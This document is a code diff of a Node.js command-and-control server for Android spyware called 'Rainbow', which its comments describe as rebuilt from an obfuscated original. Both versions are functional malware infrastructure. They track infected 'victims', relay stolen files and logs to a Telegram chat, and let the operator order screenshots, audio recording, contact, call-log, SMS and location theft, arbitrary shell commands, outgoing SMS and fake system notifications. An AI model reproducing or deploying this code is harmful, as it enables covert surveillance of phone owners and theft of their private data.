@@ -4,196 +4,199 @@ const { Server } = require('socket.io');
 const TelegramBot = require('node-telegram-bot-api');
 const multer = require('multer');
 const fs = require('fs');
-const path = require('path');
 
-// --- CARGA DE CONFIGURACIÓN ---
+/**
+ * RECONSTRUCCIÓN INTEGRAL DEL SERVIDOR C2 RAINBOW
+ * Basado en el análisis del servidor original ofuscado y archivos Smali.
+ */
+
+// Configuración cargada desde el entorno o archivo
 let config = { token: "", id: "" };
 try {
     config = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
 } catch (e) {
-    console.error("Error: Configura data.json con 'token' e 'id'.");
+    console.error("Error crítico: No se pudo cargar data.json");
     process.exit(1);
 }
 
 const app = express();
 const server = http.createServer(app);
-const io = new Server(server, { 
+const io = new Server(server, {
     cors: { origin: "*" },
     allowEIO3: true,
-    transports: ['polling', 'websocket'] 
+    transports: ['polling', 'websocket']
 });
 
 const bot = new TelegramBot(config.token, { polling: true });
 
-// Almacenamiento de estado (Imitando la lógica del original)
-const victims = {}; // { socketId: { id, model, version, ... } }
-const userState = {}; // { chatId: { target, action, tmp } }
+// Almacenamiento de víctimas y estados (appData en el original)
+const victims = {}; 
+const appData = new Map(); // Para rastrear pasos: {chatId: {target, action, step}}
 
 app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
 
-// --- ENDPOINTS HTTP (COMO EN EL ORIGINAL) ---
-
+// --- GESTIÓN DE SUBIDA DE ARCHIVOS (Ruta /upload) ---
 const upload = multer({ storage: multer.memoryStorage() });
-
 app.post('/upload', upload.single('file'), (req, res) => {
-    const devId = req.headers['currenttarget'] || "Unknown";
+    const devId = req.headers['currenttarget'] || "Desconocido";
     if (req.file) {
         bot.sendDocument(config.id, req.file.buffer, {
-            caption: `<b>📦 Archivo Recibido</b>\nID: <code>${devId}</code>`,
+            caption: `<b>✯ 𝙰𝚛𝚌𝚑𝚒𝚟𝚘 𝚛𝚎𝚌𝚒𝚋𝚒𝚍𝚘 𝚍𝚎:</b> <code>${devId}</code>`,
             parse_mode: 'HTML'
         }, { filename: req.file.originalname });
     }
-    res.send('ok');
+    res.status(200).send('Done');
 });
 
+// --- GESTIÓN DE LOGS (Ruta /text) ---
 app.post('/text', (req, res) => {
-    const devId = req.headers['currenttarget'] || "Unknown";
-    const body = req.body.text || JSON.stringify(req.body);
-    bot.sendMessage(config.id, `<b>📝 Log [${devId}]:</b>\n<pre>${body}</pre>`, { parse_mode: 'HTML' });
-    res.send('ok');
+    const devId = req.headers['currenttarget'] || "Desconocido";
+    const content = req.body.text;
+    bot.sendMessage(config.id, `<b>✯ 𝙻𝚘𝚐 𝚍𝚎 𝚍𝚒𝚜𝚙𝚘𝚜𝚒𝚝𝚒𝚟𝚘 [${devId}]:</b>\n<pre>${content}</pre>`, { parse_mode: 'HTML' });
+    res.status(200).send('Done');
 });
 
-// --- LÓGICA DE SOCKETS (DESOFUSCADA) ---
-
+// --- COMUNICACIÓN SOCKET (Fiel al Handshake original) ---
 io.on('connection', (socket) => {
-    const handshake = socket.handshake;
-    const deviceId = handshake.headers['currenttarget'] || handshake.query['currenttarget'];
-    const model = handshake.headers['model'] || handshake.query['model'] || "Android";
-    const version = handshake.headers['version'] || handshake.query['version'] || "0.0";
+    const q = socket.handshake.query;
+    const h = socket.handshake.headers;
+
+    // Extracción de metadatos tal cual el original
+    const deviceId = q.currenttarget || h['currenttarget'];
+    const model = q.model || h['model'] || "Android";
+    const version = q.version || h['version'] || "N/A";
 
     if (!deviceId) return socket.disconnect();
 
-    victims[socket.id] = {
-        id: deviceId,
-        model: model,
-        version: version,
-        ip: socket.handshake.address
-    };
+    victims[socket.id] = { id: deviceId, model: model, version: version };
 
-    bot.sendMessage(config.id, `<b>✯ Nueva conexión detectada ✯</b>\n\n<b>Modelo:</b> ${model}\n<b>ID:</b> <code>${deviceId}</code>\n<b>Versión:</b> ${version}\n<b>IP:</b> ${socket.handshake.address}`, { parse_mode: 'HTML' });
+    bot.sendMessage(config.id, `<b>✯ 𝙽𝚎𝚠 𝚍𝚎𝚟𝚒𝚌𝚎 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 ✯</b>\n\n<b>𝚖𝚘𝚍𝚎𝚕:</b> ${model}\n<b>𝚒𝚍:</b> <code>${deviceId}</code>\n<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗:</b> ${version}`, { parse_mode: 'HTML' });
 
     socket.on('data', (data) => {
-        // El servidor original loguea todo lo que llega por 'data'
-        const msg = typeof data === 'object' ? JSON.stringify(data, null, 2) : data;
-        bot.sendMessage(config.id, `<b>📨 Datos de ${model}:</b>\n<pre>${msg}</pre>`, { parse_mode: 'HTML' });
+        const payload = typeof data === 'object' ? JSON.stringify(data, null, 2) : data;
+        bot.sendMessage(config.id, `<b>✯ 𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎 𝚏𝚛𝚘𝚖 ${model} ✯</b>\n<pre>${payload}</pre>`, { parse_mode: 'HTML' });
     });
 
     socket.on('disconnect', () => {
         if (victims[socket.id]) {
-            bot.sendMessage(config.id, `<b>❌ Dispositivo Offline:</b> ${victims[socket.id].model}`);
+            bot.sendMessage(config.id, `<b>❌ 𝙳𝚒𝚜𝚙𝚘𝚜𝚒𝚝𝚒vo 𝚍𝚒𝚜𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍:</b> ${victims[socket.id].model}`);
             delete victims[socket.id];
         }
     });
 });
 
-// --- MENÚS Y COMANDOS (LÓGICA LITERAL DEL SERVIDOR ORIGINAL) ---
-
-const MAIN_KEYBOARD = [['📱 Dispositivos'], ['📢 Acciones Globales'], ['ℹ️ Información']];
-
-const DEVICE_ACTIONS = [
-    ['✯ Captura de Pantalla ✯', '✯ Grabadora Audio ✯'],
-    ['✯ Lista Archivos ✯', '✯ SMS Manager ✯'],
-    ['✯ Contactos ✯', '✯ Llamadas ✯'],
-    ['✯ Clipboard ✯', '✯ Apps Instaladas ✯'],
-    ['✯ Notificación Push ✯', '✯ Shell Command ✯'],
-    ['✯ Vibrar ✯', '✯ Ubicación ✯'],
-    ['↩️ Menú Principal']
+// --- TECLADOS EXACTOS (Estructura de server(1).js) ---
+const KB_MAIN = [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯'], ['✯ 𝙰𝚌𝚝𝚒𝚘𝚗𝚜 𝚏𝚘𝚛 𝚊𝚕𝚕 ✯']];
+const KB_ACTIONS = [
+    ['✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯', '✯ 𝙰𝚞𝚍𝚒𝚘 𝚛𝚎𝚌𝚘𝚛𝚍𝚎𝚛 ✯'],
+    ['✯ 𝙵𝚒𝚕𝚎 𝚖𝚊𝚗𝚊𝚐𝚎𝚛 ✯', '✯ 𝚂𝙼𝚂 𝚖𝚊𝚗𝚊𝚐𝚎𝚛 ✯'],
+    ['✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯', '✯ 𝙲𝚊𝚕𝚕 𝚕𝚘𝚐𝚜 ✯'],
+    ['✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯', '✯ 𝙸𝚗𝚜𝚝𝚊𝚕𝚕𝚎𝚍 𝚊𝚙𝚙𝚜 ✯'],
+    ['✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯', '✯ 𝚂𝚑𝚎𝚕𝚕 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 ✯'],
+    ['✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯', '✯ 𝙻𝚘𝚌𝚊𝚝𝚒𝚘𝚗 ✯'],
+    ['✯ 𝙼𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']
 ];
 
+// --- PROCESAMIENTO DE MENSAJES TELEGRAM ---
 bot.on('message', (msg) => {
     const chatId = msg.chat.id;
     if (String(chatId) !== String(config.id)) return;
     const text = msg.text;
 
-    // Lógica de navegación
-    if (text === '/start' || text === '↩️ Menú Principal') {
-        delete userState[chatId];
-        return bot.sendMessage(chatId, "<b>✯ Menú Principal ✯</b>", {
+    if (text === '/start' || text === '✯ 𝙼𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯') {
+        appData.delete(chatId);
+        return bot.sendMessage(chatId, "<b>✯ 𝙼𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯</b>", {
             parse_mode: 'HTML',
-            reply_markup: { keyboard: MAIN_KEYBOARD, resize_keyboard: true }
+            reply_markup: { keyboard: KB_MAIN, resize_keyboard: true }
         });
     }
 
-    if (text === '📱 Dispositivos') {
+    if (text === '✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯') {
         const list = Object.keys(victims).map(sid => [`${victims[sid].model} (${victims[sid].id})`]);
-        if (list.length === 0) return bot.sendMessage(chatId, "No hay dispositivos conectados.");
-        list.push(['↩️ Menú Principal']);
-        return bot.sendMessage(chatId, "<b>Selecciona un dispositivo:</b>", {
+        if (list.length === 0) return bot.sendMessage(chatId, "No devices connected.");
+        list.push(['✯ 𝙼𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']);
+        return bot.sendMessage(chatId, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚍𝚎𝚟𝚒𝚌𝚎 ✯</b>", {
             parse_mode: 'HTML',
             reply_markup: { keyboard: list, resize_keyboard: true }
         });
     }
 
-    // Detectar si el usuario seleccionó un dispositivo de la lista
+    // Lógica de selección de víctima
     for (const sid in victims) {
-        const identifier = `${victims[sid].model} (${victims[sid].id})`;
-        if (text === identifier) {
-            userState[chatId] = { target: sid };
-            return bot.sendMessage(chatId, `<b>Controlando: ${victims[sid].model}</b>\nSelecciona acción:`, {
+        if (text === `${victims[sid].model} (${victims[sid].id})`) {
+            appData.set(chatId, { target: sid });
+            return bot.sendMessage(chatId, `<b>✯ 𝙰𝚌𝚝𝚒𝚘𝚗𝚜 𝚏𝚘𝚛 ${victims[sid].model} ✯</b>`, {
                 parse_mode: 'HTML',
-                reply_markup: { keyboard: DEVICE_ACTIONS, resize_keyboard: true }
+                reply_markup: { keyboard: KB_ACTIONS, resize_keyboard: true }
             });
         }
     }
 
-    const state = userState[chatId];
+    const state = appData.get(chatId);
     if (!state || !state.target) return;
-    const targetSocket = io.sockets.sockets.get(state.target);
 
-    // Lógica de Comandos Específicos (Traducido de la ofuscación de server.js)
-    if (targetSocket) {
-        let order = "";
-        let extra = {};
+    const socket = io.sockets.sockets.get(state.target);
+    if (!socket) {
+        bot.sendMessage(chatId, "Device lost connection.");
+        return appData.delete(chatId);
+    }
 
+    // Gestión de comandos (Traducción literal del Switch ofuscado)
+    let payload = null;
+
+    // Primero verificamos si estamos en un "paso" de entrada de datos
+    if (state.step) {
+        switch (state.step) {
+            case 'RECORD':
+                payload = { order: 'record-audio', duration: text };
+                break;
+            case 'SHELL':
+                payload = { order: 'shell', command: text };
+                break;
+            case 'PUSH':
+                payload = { order: 'notification', title: 'System Message', text: text };
+                break;
+            case 'SMS_NUM':
+                state.temp_num = text;
+                state.step = 'SMS_MSG';
+                return bot.sendMessage(chatId, "<b>✯ Enter the message ✯</b>", { parse_mode: 'HTML' });
+            case 'SMS_MSG':
+                payload = { order: 'send-sms', number: state.temp_num, text: text };
+                break;
+        }
+        delete state.step;
+    } else {
+        // Switch de comandos principales
         switch (text) {
-            case '✯ Captura de Pantalla ✯': order = "screenshot"; break;
-            case '✯ Grabadora Audio ✯': 
-                userState[chatId].action = "record_audio";
-                return bot.sendMessage(chatId, "Ingresa duración en segundos:");
-            case '✯ Lista Archivos ✯': order = "file-explorer"; extra = { path: "/" }; break;
-            case '✯ SMS Manager ✯':
-                const smsMenu = [['✯ Leer SMS ✯', '✯ Enviar SMS ✯'], ['↩️ Menú Principal']];
-                return bot.sendMessage(chatId, "SMS Manager:", { reply_markup: { keyboard: smsMenu, resize_keyboard: true } });
-            case '✯ Contactos ✯': order = "contacts"; break;
-            case '✯ Llamadas ✯': order = "calls"; break;
-            case '✯ Clipboard ✯': order = "clipboard"; break;
-            case '✯ Apps Instaladas ✯': order = "apps"; break;
-            case '✯ Vibrar ✯': order = "vibrate"; break;
-            case '✯ Ubicación ✯': order = "location"; break;
-            case '✯ Shell Command ✯':
-                userState[chatId].action = "shell";
-                return bot.sendMessage(chatId, "Escribe el comando shell:");
-            case '✯ Notificación Push ✯':
-                userState[chatId].action = "push";
-                return bot.sendMessage(chatId, "Escribe el texto de la notificación:");
+            case '✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯': payload = { order: 'screenshot' }; break;
+            case '✯ 𝙵𝚒𝚕𝚎 𝚖𝚊𝚗𝚊𝚐𝚎𝚛 ✯': payload = { order: 'file-explorer', path: '/' }; break;
+            case '✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯': payload = { order: 'contacts' }; break;
+            case '✯ 𝙲𝚊𝚕𝚕 𝚕𝚘𝚐𝚜 ✯': payload = { order: 'calls' }; break;
+            case '✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯': payload = { order: 'clipboard' }; break;
+            case '✯ 𝙸𝚗𝚜𝚝𝚊𝚕𝚕𝚎𝚍 𝚊𝚙𝚙𝚜 ✯': payload = { order: 'apps' }; break;
+            case '✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯': payload = { order: 'vibrate' }; break;
+            case '✯ 𝙻𝚘𝚌𝚊𝚝𝚒𝚘𝚗 ✯': payload = { order: 'location' }; break;
+            case '✯ 𝙰𝚞𝚍𝚒𝚘 𝚛𝚎𝚌𝚘𝚛𝚍𝚎𝚛 ✯':
+                state.step = 'RECORD';
+                return bot.sendMessage(chatId, "<b>✯ Enter duration (seconds) ✯</b>", { parse_mode: 'HTML' });
+            case '✯ 𝚂𝚑𝚎𝚕𝚕 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 ✯':
+                state.step = 'SHELL';
+                return bot.sendMessage(chatId, "<b>✯ Enter shell command ✯</b>", { parse_mode: 'HTML' });
+            case '✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯':
+                state.step = 'PUSH';
+                return bot.sendMessage(chatId, "<b>✯ Enter notification text ✯</b>", { parse_mode: 'HTML' });
+            case '✯ 𝚂𝙼𝚂 𝚖𝚊𝚗𝚊𝚐𝚎𝚛 ✯':
+                state.step = 'SMS_NUM';
+                return bot.sendMessage(chatId, "<b>✯ Enter phone number ✯</b>", { parse_mode: 'HTML' });
         }
+    }
 
-        // Manejo de respuestas pendientes (Input del usuario)
-        if (state.action) {
-            if (state.action === "record_audio") {
-                order = "record-audio"; extra = { duration: text };
-                delete userState[chatId].action;
-            } else if (state.action === "shell") {
-                order = "shell"; extra = { command: text };
-                delete userState[chatId].action;
-            } else if (state.action === "push") {
-                order = "notification"; extra = { title: "System Update", text: text };
-                delete userState[chatId].action;
-            }
-        }
-
-        if (order) {
-            // ESTRUCTURA EXACTA DEL ORIGINAL:
-            // Emitir por 'data' con objeto { order, ...extras }
-            targetSocket.emit('data', {
-                order: order,
-                ...extra
-            });
-            bot.sendMessage(chatId, `🚀 Enviado: <code>${order}</code>`, { parse_mode: 'HTML' });
-        }
+    if (payload) {
+        // EL SECRETO: El servidor original emite el objeto directamente bajo 'data'
+        socket.emit('data', payload);
+        bot.sendMessage(chatId, `🚀 𝙾𝚛𝚍𝚎𝚛 𝚜𝚎𝚗𝚝: <code>${payload.order}</code>`, { parse_mode: 'HTML' });
     }
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`Servidor Rainbow (Original Clone) en puerto ${PORT}`));
+server.listen(PORT, () => console.log(`C2 Server running on port ${PORT}`));
